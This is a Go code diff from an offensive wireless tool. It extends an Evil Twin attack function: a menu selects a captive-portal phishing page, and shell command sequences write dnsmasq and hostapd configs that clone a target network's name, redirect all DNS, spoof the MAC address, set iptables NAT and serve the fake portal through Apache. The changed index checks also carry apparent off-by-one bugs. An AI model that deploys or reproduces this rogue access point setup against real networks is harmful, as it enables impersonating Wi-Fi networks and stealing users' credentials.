@@ -1529,18 +1529,88 @@ func deepScanning(channelList []int, bssid string) {
 // Run Evil Twin attack with captive portal function
 func runEvilTwin(nameiface string) {
 	var nodeauthStarting bool = false
-	var webmodel = "EvilTwin/html" // default until model selecter
+	path, _ := os.Getwd()
 	var handle2 *pcap.Handle
+	var webmodel string
 	apnameiface = nameiface
 	tableinj.ESSID = fmt.Sprintf(" %s", tableinj.ESSID)
 	for step := 0; step < 2; step++ {
-		time.Sleep(350 * time.Millisecond)
-		libs.PrintLogo(color, "Setup Evil-Twin attack...")
-		time.Sleep(1 * time.Second)
 		switch step {
 		case 0:
-			// website model selecter for captive portal (soon)
+			for {
+				time.Sleep(350 * time.Millisecond)
+				libs.PrintLogo(color, "Setup Evil-Twin attack...")
+				time.Sleep(1 * time.Second)
+				if files, err := os.ReadDir(fmt.Sprintf("%s/EvilTwin/models", path)); err == nil && len(files) > 0 {
+					var modelsfound []string
+					for _, file := range files {
+						subfiles, _ := os.ReadDir(fmt.Sprintf("%s/EvilTwin/models/%s", path, file.Name())) 
+						for _, subfile := range subfiles {
+							if subfile.Name() == "DESCRIPTION" {
+								modelsfound = append(modelsfound, file.Name())
+							}
+						}
+					}
+					if len(modelsfound) > 0 {
+						var found bool = false
+						var writer *tabwriter.Writer = tabwriter.NewWriter(os.Stdout, 0, 0, 5, ' ', 0)
+						fmt.Fprintf(writer, "%s\tIndex\tModel\tDescription\n", color.White)
+						for index, model := range modelsfound {
+							var emptyModel bool = true
+							var modelTitle, modelDescription string = "", "Not available"
+							if descr, err := os.ReadFile(fmt.Sprintf("%s/EvilTwin/models/%s/DESCRIPTION", path, model)); err == nil {
+								for _, descrline := range strings.Split(string(descr), "\n") {
+									if strings.HasPrefix(descrline, "&TITLE:") {
+										modelTitle, _ = strings.CutPrefix(descrline, "&TITLE:")
+										if len(modelTitle) > 0 {
+											emptyModel, found = false, true
+										}
+										modelTitle = strings.ReplaceAll(strings.Trim(modelTitle, " "), string(13), "")
+									} else if strings.HasPrefix(descrline, "&DESCRIPTION:") {
+										modelDescription, _ = strings.CutPrefix(descrline, "&DESCRIPTION:")
+										modelDescription = strings.ReplaceAll(strings.Trim(modelDescription, " "), string(13), "") 
+									}
+								}	
+							}
+							if !emptyModel {
+								fmt.Fprintf(writer, "%s\t%d\t%s\t%s\n", color.White, index, modelTitle, modelDescription)
+								emptyModel = true
+							}
+						}
+						if found {
+							writer.Flush()
+							var modelindexScan string
+							time.Sleep(1500 * time.Millisecond)
+							fmt.Printf("\n%s[%sINPUT%s] Select available model [0-%s]: ", color.White, color.Green, color.White, strconv.Itoa(len(modelsfound)-1))
+							fmt.Scanln(&modelindexScan)
+							fmt.Println()
+							if modelindexScan == "" {
+								libs.Error(color, "Selection error, updating...")
+								time.Sleep(2 * time.Second)
+								continue
+							} else if modelindex, err := strconv.Atoi(modelindexScan); err == nil {
+								if modelindex < 0 || modelindex > len(modelindexScan) {
+									libs.Error(color, "Selection error, updating...")
+									time.Sleep(2 * time.Second)
+									continue
+								} else {
+									webmodel = fmt.Sprintf("%s/EvilTwin/models/%s/html", path, modelsfound[modelindex])
+									break
+								}
+							} else {
+								libs.Error(color, "Selection error (is number?), updating...")
+								time.Sleep(2 * time.Second)
+								continue
+							}
+						}
+					}
+				}	
+				libs.SignalError(color, "No valid web-page model found.")
+			}
 		case 1:
+			time.Sleep(350 * time.Millisecond)
+			libs.PrintLogo(color, "Setup Evil-Twin attack...")
+			time.Sleep(1 * time.Second)
 			var ifacesFound bool = false
 			var avifaces []libs.Ifaces
 			var writer *tabwriter.Writer = tabwriter.NewWriter(os.Stdout, 0, 0, 5, ' ', 0)
@@ -1566,19 +1636,19 @@ func runEvilTwin(nameiface string) {
 					nodeauthStarting = true
 					time.Sleep(3 * time.Second)
 				} else if ifaceindex, err := strconv.Atoi(ifaceindexScan); err == nil {
-					if ifaceindex < 0 || ifaceindex > len(avifaces)-1 {
-						libs.Error(color, "Selection error, updating...\n")
+					if ifaceindex < 0 || ifaceindex > len(avifaces) {
+						libs.Error(color, "Selection error, updating...")
 						time.Sleep(2 * time.Second)
 					} else {
 						nameiface = avifaces[ifaceindex].Name
 						if !libs.MonSupportCheck(nameiface) {
-							libs.Error(color, fmt.Sprintf("%s don't support monitor mode, updating...\n", apnameiface))
+							libs.Error(color, fmt.Sprintf("%s don't support monitor mode, updating...", apnameiface))
 							time.Sleep(2 * time.Second)
 						} else if tableinj.CHANNEL > 14 && !libs.G5Check(nameiface) {
-							libs.Error(color, fmt.Sprintf("%s don't support 5 Ghz (iface's channel: %d), updating...\n", apnameiface, tableinj.CHANNEL))
+							libs.Error(color, fmt.Sprintf("%s don't support 5 Ghz (iface's channel: %d), updating...", apnameiface, tableinj.CHANNEL))
 							time.Sleep(2 * time.Second)
 						} else {
-							fmt.Printf("%s[%sLOG%s] %s: Setting up monitor mode ...", color.White, color.Blue, color.White, nameiface)
+							fmt.Printf("%s[%sLOG%s] %s: Setting up monitor mode ... ", color.White, color.Blue, color.White, nameiface)
 							if err := libs.SetMonitorMode(nameiface); err {
 								fmt.Printf("%sFAIL\n\n%s", color.Red, color.White)
 								libs.Error(color, "Bad interface.")
@@ -1609,15 +1679,7 @@ func runEvilTwin(nameiface string) {
 	for trycounter < 3 {
 		trycounter++
 		libs.PrintLogo(color, "Setup Evil-Twin attack...")
-		var dnsmasqconf string = "interface=br0\nlisten-address=10.1.1.1\nno-hosts\ndhcp-range=10.1.1.2,10.1.1.254,10m\ndhcp-option=option:router,10.1.1.1\ndhcp-authoritative\naddress=/#/10.1.1.1"
-		os.WriteFile("/etc/dnsmasq.conf", []byte(dnsmasqconf), 0644)
-		libs.Log(color, "Creating dnsmasq config file ... Done")
-		var apconf string = fmt.Sprintf("interface=%s\nssid=%s\nhw_mode=g\nieee80211n=1\nchannel=%d\nwmm_enabled=1\nauth_algs=1\nbridge=br0", apnameiface, tableinj.ESSID, tableinj.CHANNEL)
-		path, _ := os.Getwd()
-		os.WriteFile(path+"/config/apconf", []byte(apconf), 0644)
-		libs.Log(color, "Creating hostapd config file ... Done")
-		os.WriteFile(path+"/etc/apache2/conf-available/override.conf", []byte("<Directory /var/www/>\n    Options Indexes FollowSymLinks MultiViews\n    AllowOverride All\n    Order Allow,Deny\n    Allow from all\n</Directory>"), 0644)
-		libs.Log(color, "Creating Apache2 config file ... Done")
+
 		if libs.IsRunning("hostapd") || libs.IsRunning("dnsmasq") {
 			libs.Rtexec(exec.Command("bash", "-c", "killall hostapd dnsmasq"))
 			libs.Log(color, "Killing hostapd and dnsmasq process ... Done")
@@ -1628,8 +1690,13 @@ func runEvilTwin(nameiface string) {
 		} else {
 			changedMac = tableinj.SRC[0][:len(tableinj.SRC[0])-1] + "1"
 		}
-		var ETSetupCommands []string = []string{"cd /etc/apache2/conf-enabled && ln -f -s ../conf-available/override.conf override.conf && cd /etc/apache2/mods-enabled && ln -f -s ../mods-available/rewrite.load rewrite.load && rm /var/log/apache2/access.log && touch /var/log/apache2/access.log",
-			fmt.Sprintf("cp -Rf %s /var/www/ && chown -R www-data:www-data /var/www/html && chown root:www-data /var/www/html/.htaccess", webmodel),
+
+		var ETSetupCommands []string = []string{
+			"echo -e \"interface=br0\nlisten-address=10.1.1.1\nno-hosts\ndhcp-range=10.1.1.2,10.1.1.254,10m\ndhcp-option=option:router,10.1.1.1\ndhcp-authoritative\naddress=/#/10.1.1.1\" > /etc/dnsmasq.conf",
+			fmt.Sprintf("echo -e \"interface=%s\nssid=%s\nhw_mode=g\nieee80211n=1\nchannel=%d\nwmm_enabled=1\nauth_algs=1\nbridge=br0\" > %s/config/apconf", apnameiface, tableinj.ESSID, tableinj.CHANNEL, path),
+			fmt.Sprintf("echo -e \"<Directory /var/www/>\n    Options Indexes FollowSymLinks MultiViews\n    AllowOverride All\n    Order Allow,Deny\n    Allow from all\n</Directory>\" %s/etc/apache2/conf-available/override.conf", path),
+			"cd /etc/apache2/conf-enabled && ln -f -s ../conf-available/override.conf override.conf && cd /etc/apache2/mods-enabled && ln -f -s ../mods-available/rewrite.load rewrite.load && rm /var/log/apache2/access.log && touch /var/log/apache2/access.log",
+			fmt.Sprintf("cp -Rf %s /var/www/ && cp -f EvilTwin/.htaccess /var/www/html && chown -R www-data:www-data /var/www/html && chown root:www-data /var/www/html/.htaccess", webmodel),
 			fmt.Sprintf("ifconfig %s down", apnameiface),
 			fmt.Sprintf("macchanger -m %s %s", libs.Fmac(changedMac), apnameiface),
 			fmt.Sprintf("ifconfig %s up", apnameiface),
@@ -1646,7 +1713,11 @@ func runEvilTwin(nameiface string) {
 			"iptables -t nat -A POSTROUTING -j MASQUERADE",
 			"service dnsmasq start & service dnsmasq restart",
 			"service apache2 start & service apache2 restart"}
-		var ETSetupStatus []string = []string{"Setup Apache2 config",
+		var ETSetupStatus []string = []string{
+			"Creating dnsmasq config file",
+			"Creating hostapd config file",
+			"Creating apache2 config file",
+			"Setup Apache2 config",
 			"Setup web-site",
 			"",
 			fmt.Sprintf("Changing MAC address [%s]", libs.Fmac(changedMac)),
@@ -1663,10 +1734,10 @@ func runEvilTwin(nameiface string) {
 			"Set iptables config (3/4)",
 			"Set iptables config (4/4)",
 			"Starting dnsmasq",
-			"Starting Apache2 server"}
-		var ETSetupWait []int = []int{600, 600, 1000, 1500, 1000, 400, 4000, 2000, 2000, 300, 200, 200, 100, 100, 100, 100, 2000, 500}
+			"Starting apache2 server"}
+		var ETSetupWait []int = []int{300, 300, 300, 600, 600, 1000, 1500, 1000, 400, 4000, 2000, 2000, 300, 200, 200, 100, 100, 100, 100, 2000, 500}
 		panicExit, eviltwinAcc = false, true
-		for seqindex := 0; seqindex < 18; seqindex++ {
+		for seqindex := 0; seqindex < 21; seqindex++ {
 			if panicExit {
 				eviltwinQuit = true
 				return
@@ -1676,7 +1747,7 @@ func runEvilTwin(nameiface string) {
 			}
 			var err bool
 			var msgerr string
-			if seqindex != 6 {
+			if seqindex != 9 {
 				msgerr, err = libs.Rtexec(exec.Command("bash", "-c", ETSetupCommands[seqindex]))
 			} else {
 				go libs.Rtexec(exec.Command("bash", "-c", ETSetupCommands[seqindex]))
